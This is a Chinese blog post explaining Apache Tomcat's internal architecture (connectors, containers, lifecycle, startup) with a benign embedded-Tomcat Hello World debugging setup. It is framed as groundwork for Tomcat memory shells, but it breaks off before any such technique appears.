<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Tomcat 架构原理 &amp; Tomcat内存马 | n4c1's Blog</title><meta name="author" content="n4c1"><meta name="copyright" content="n4c1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Tomcat 架构原理 &amp; Tomcat内存马先阅读# Tomcat 架构原理解析到架构设计借鉴 Tomcat 设计了两个核心组件连接器（Connector）和容器（Container）。连接器负责对外交流，容器负责内部 处理  连接器结构连接器又分为两部分 &#x3D;&#x3D;ProtocolHandler&#x3D;&#x3D;和&#x3D;&#x3D;Adapter&#x3D;&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="Tomcat 架构原理 &amp; Tomcat内存马">
<meta property="og:url" content="http://example.com/2025/09/10/Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="n4c1&#39;s Blog">
<meta property="og:description" content="Tomcat 架构原理 &amp; Tomcat内存马先阅读# Tomcat 架构原理解析到架构设计借鉴 Tomcat 设计了两个核心组件连接器（Connector）和容器（Container）。连接器负责对外交流，容器负责内部 处理  连接器结构连接器又分为两部分 &#x3D;&#x3D;ProtocolHandler&#x3D;&#x3D;和&#x3D;&#x3D;Adapter&#x3D;&amp;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/head.jpg">
<meta property="article:published_time" content="2025-09-10T06:38:59.000Z">
<meta property="article:modified_time" content="2025-09-10T07:41:25.547Z">
<meta property="article:author" content="n4c1">
<meta property="article:tag" content="Tomcat内存马">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/head.jpg"><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://example.com/2025/09/10/Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Tomcat 架构原理 & Tomcat内存马',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-09-10 15:41:25'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="n4c1's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/home_page.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="n4c1's Blog"><span class="site-name">n4c1's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Tomcat 架构原理 &amp; Tomcat内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-10T06:38:59.000Z" title="发表于 2025-09-10 14:38:59">2025-09-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-10T07:41:25.547Z" title="更新于 2025-09-10 15:41:25">2025-09-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/JavaSec/">JavaSec</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Tomcat 架构原理 &amp; Tomcat内存马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Tomcat-架构原理-Tomcat内存马"><a href="#Tomcat-架构原理-Tomcat内存马" class="headerlink" title="Tomcat 架构原理 &amp; Tomcat内存马"></a>Tomcat 架构原理 &amp; Tomcat内存马</h1><p>先阅读<br><a target="_blank" rel="noopener" href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09"># Tomcat 架构原理解析到架构设计借鉴</a></p>
<p><strong>Tomcat 设计了两个核心组件连接器（Connector）和容器（Container）。连接器负责对外交流，容器负责内部 处理</strong></p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722011346.png" alt="image.png"></p>
<h3 id="连接器结构"><a href="#连接器结构" class="headerlink" title="连接器结构"></a>连接器结构</h3><p>连接器又分为两部分 &#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;和&#x3D;&#x3D;<code>Adapter</code>&#x3D;&#x3D;<br>其中&#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;负责与&#x3D;&#x3D;socket&#x3D;&#x3D;交互并将数据转换为其转换为&#x3D;&#x3D;<code>Tomcat Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Tomcat Respone</code>&#x3D;&#x3D;<br>由于这并不是标准的Servlet请求或响应, tomcat在设计时使用&#x3D;&#x3D;<code>Adapter</code>&#x3D;&#x3D;来将  &#x3D;&#x3D;<code>Tomcat Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Tomcat Respone</code> &#x3D;&#x3D;转换为标准的&#x3D;&#x3D;<code>Servlet Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Servlet Respone</code>&#x3D;&#x3D;</p>
<h4 id="ProtocolHandler"><a href="#ProtocolHandler" class="headerlink" title="ProtocolHandler"></a><code>ProtocolHandler</code></h4><p>&#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;又包含了&#x3D;&#x3D;<code>EndedPoint</code>&#x3D;&#x3D;和&#x3D;&#x3D;<code>Processor</code>&#x3D;&#x3D;这两部分<br><code>EndPoint</code>是通信端点，即通信监听的接口，是具体的&#x3D;&#x3D;Socket &#x3D;&#x3D;接收和发送处理器，是对传输层的抽象，因此 <code>EndPoint</code>是用来实现 <code>TCP/IP</code> 协议数据读写的，本质调用操作系统的 socket 接口。<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720234251.png" alt="image.png"></p>
<h5 id="EndPoint"><a href="#EndPoint" class="headerlink" title="EndPoint"></a><code>EndPoint</code></h5><p>&#x3D;&#x3D;<code>EndPoint</code>&#x3D;&#x3D;是通信端点，即&#x3D;&#x3D;通信监听的接口&#x3D;&#x3D;，是具体的 Socket 接收和发送处理器，是对传输层的抽象，因此 <code>EndPoint</code>是用来实现 <code>TCP/IP</code> 协议数据读写的，本质调用操作系统的 socket 接口。<br>其工作流程如下图<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722012456.png" alt="image.png"></p>
<h5 id="Proccessor"><a href="#Proccessor" class="headerlink" title="Proccessor"></a><code>Proccessor</code></h5><p>Processor 用来实现 HTTP 协议，Processor 接收来自 <code>EndPoint</code>的 <code>Socket</code>，读取字节流解析成 Tomcat <code>Request</code>和 <code>Response</code>对象，并通过 <code>Adapter</code>将其提交到容器处理，<code>Processor</code>是对应用层协议的抽象。</p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720234159.png" alt="image.png"></p>
<h4 id="Adapter"><a href="#Adapter" class="headerlink" title="Adapter"></a>Adapter</h4><p>由于协议的不同，Tomcat 定义了自己的 <code>Request</code> 类来存放请求信息，这里其实体现了面向对象的思维。但是这个 Request 不是标准的 <code>ServletRequest</code> ，所以不能直接使用 Tomcat 定义 Request 作为参数直接容器。</p>
<p>Tomcat 设计者的解决方案是引入 <code>CoyoteAdapter</code>，这是适配器模式的经典运用，<code>Acceptor</code>监听连接生成 <code>SocketProcessor</code> 调用 <code>CoyoteAdapter</code> 的 <code>Sevice</code> 方法，传入的是 <code>Tomcat Request</code> 对象，<code>CoyoteAdapter</code>负责将 <code>Tomcat Request</code> 转成 <code>ServletRequest</code>，再调用容器的 <code>Service</code>方法</p>
<h3 id="Servlet容器结构"><a href="#Servlet容器结构" class="headerlink" title="Servlet容器结构"></a>Servlet容器结构</h3><p>具体结构如下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720162109.png" alt="image.png"></p>
<p>一个 &#x3D;&#x3D;Service&#x3D;&#x3D; 只能有 一个 &#x3D;&#x3D;<code>Engine</code>&#x3D;&#x3D;, 一个 &#x3D;&#x3D;<code>Engine</code>&#x3D;&#x3D;可以管理多个站点(&#x3D;&#x3D;Host&#x3D;&#x3D;),  一个站点有多个&#x3D;&#x3D;<code>Context</code>&#x3D;&#x3D;(url路径), 一个context下可以有多个&#x3D;&#x3D;<code>servlet</code>&#x3D;&#x3D;, <code>Wrapper</code> 表示一个 <code>Servlet</code><br>为了方便, tomcat使用[[组合模式]]来管理只有一个具有父子关系地树形结构, 具体是: <strong>所有容器组件都实现了 <code>Container</code>接口，因此组合模式可以使得用户对单容器对象和组合容器对象的使用具有一致性</strong>。这里单容器对象指的是最底层的 <code>Wrapper</code>，组合容器对象指的是上面的 <code>Context</code>、<code>Host</code>或者 <code>Engine</code>。<code>Container</code> 接口定义如下：<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722013756.png" alt="image.png"></p>
<h5 id="Lifecycle-生命周期"><a href="#Lifecycle-生命周期" class="headerlink" title="Lifecycle 生命周期"></a>Lifecycle 生命周期</h5><p><code>Container</code>接口还继承了&#x3D;&#x3D;Lifecycle&#x3D;&#x3D;,Tomcat 就是通过 <code>Lifecycle</code> 统一管理所有容器的组件的&#x3D;&#x3D;生命周期&#x3D;&#x3D;。通过组合模式管理所有容器，拓展 <code>Lifecycle</code> 实现对每个组件的生命周期管理 ，<code>Lifecycle</code> 主要包含的方法&#x3D;&#x3D;<code>init()、start()、stop() 和 destroy()</code>&#x3D;&#x3D;。这样当一个<code>Context</code>, 其下面的wrapper也会被关闭</p>
<p>此外 因为各个组件<code>init()</code> 和 <code>start()</code> 方法的具体实现是复杂多变的，比如在 Host 容器的启动方法里需要扫描 webapps 目录下的 Web 应用，创建相应的 Context 容器,  如果下次有需要加入新的逻辑, 直接修改<code>init()</code> 和 <code>start()</code> 方法的话就会违背&#x3D;&#x3D;开闭原则&#x3D;&#x3D;, 因此tomcat采用[[观察者模式]]来解决这一问题<br>以下就是 <code>Lyfecycle</code> 接口的定义:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014620.png" alt="image.png"></p>
<p>此外 Tomcat 定义一个基类 &#x3D;&#x3D;<code>LifeCycleBase</code>&#x3D;&#x3D; 来实现<code> LifeCycle</code> 接口，把一些&#x3D;&#x3D;公共的逻辑&#x3D;&#x3D;放到基类中去，比如&#x3D;&#x3D;生命状态的转变与维护&#x3D;&#x3D;、&#x3D;&#x3D;生命事件的触发以及监听器的添加和删除&#x3D;&#x3D;等，而子类就负责实现自己的&#x3D;&#x3D;初始化&#x3D;&#x3D;、&#x3D;&#x3D;启动和停止等方法&#x3D;&#x3D;。<br>典型的&#x3D;&#x3D;抽象模板设计模式&#x3D;&#x3D;<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014824.png" alt="image.png"></p>
<p>总体设计图<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722015102.png" alt="image.png"></p>
<h3 id="Tomcat启动流程"><a href="#Tomcat启动流程" class="headerlink" title="Tomcat启动流程"></a>Tomcat启动流程</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014956.png" alt="image.png"></p>
<ul>
<li>Tomcat 本生就是一个 Java 程序，所以 startup.sh 脚本就是启动一个 JVM 来运行 Tomcat 的启动类 Bootstrap。</li>
<li>Bootstrap 主要就是实例化 Catalina 和初始化 Tomcat 自定义的类加载器。热加载与热部署就是靠他实现。</li>
<li>Catalina: 解析 server.xml 创建 Server 组件，并且调用 Server.start() 方法。</li>
<li>Server：管理 Service 组件，调用 Service 的 start() 方法。</li>
<li>Service：主要职责就是管理顶层容器 Engine，分别调用 <code>Connector</code> 和 <code>Engine</code> 的 <code>start</code> 方法。</li>
</ul>
<h4 id="init流程"><a href="#init流程" class="headerlink" title="init流程"></a>init流程</h4><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722144446.png" alt="image.png"></p>
<h4 id="start流程"><a href="#start流程" class="headerlink" title="start流程"></a>start流程</h4><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722144529.png" alt="image.png"></p>
<h4 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h4><p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span>  </span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servletMemoryShell<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span>        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.memshell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleException;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.startup.Tomcat;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> LifecycleException &#123;  </span><br><span class="line">        <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();  </span><br><span class="line">        tomcat.getConnector(); <span class="comment">//tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603  </span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());  </span><br><span class="line">        Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());  </span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);  </span><br><span class="line">        tomcat.start();  </span><br><span class="line">        tomcat.getServer().await();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HelloServlet.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.memshell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);  </span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();  </span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);  </span><br><span class="line">        out.println(<span class="string">&quot;Hello, World!&quot;</span>);  </span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了便于调试, 这里使用的是&#x3D;&#x3D;嵌入式的tomcat&#x3D;&#x3D;, 启动方式有所不同<br>嵌入式的启动是使用&#x3D;&#x3D;<code>org.apache.catalina.startup.Tomcat</code>&#x3D;&#x3D;类的一个简易启动, 而传统的启动则使用&#x3D;&#x3D;Catalina&#x3D;&#x3D;配合&#x3D;&#x3D;Bootstrap&#x3D;&#x3D;来完成启动的</p>
<ul>
<li><p><strong>嵌入式 Tomcat 启动：</strong> 使用 <code>Tomcat</code> 类的一个<strong>简易启动</strong>方式。</p>
<ul>
<li><code>Tomcat</code> 类作为高层 API，封装了底层 Catalina 组件的创建和配置细节，让开发者可以通过编程方式快速启动一个 Tomcat 实例。它在内部会隐式地创建和组装 <code>Server</code>、<code>Service</code>、<code>Engine</code>、<code>Host</code> 等核心组件。</li>
</ul>
</li>
<li><p><strong>传统 Tomcat 启动：</strong> 使用 <code>Catalina</code> 配合 <code>Bootstrap</code>。</p>
<ul>
<li><p><code>Bootstrap</code> 是<strong>引导程序</strong>，负责环境准备、类加载器设置，并调用 <code>Catalina</code> 的核心方法。</p>
</li>
<li><p><code>Catalina</code> 是<strong>核心容器的管理者</strong>，它根据 <code>server.xml</code> 等配置文件来解析、创建和协调 <code>Server</code>、<code>Service</code>、<code>Engine</code>、<code>Host</code> 等所有核心容器组件的生命周期。</p>
</li>
</ul>
</li>
</ul>
<p>先来看</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();  </span><br><span class="line">tomcat.getConnector();</span><br></pre></td></tr></table></figure>
<p>创建tomcat建议启动器实例, 获取Connector, 跟进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722160040.png" alt="image.png"><br>这里getService跟进去是这样</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Service <span class="title function_">getService</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> getServer().findServices()[<span class="number">0</span>];  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>getServer跟进去是这样</p>
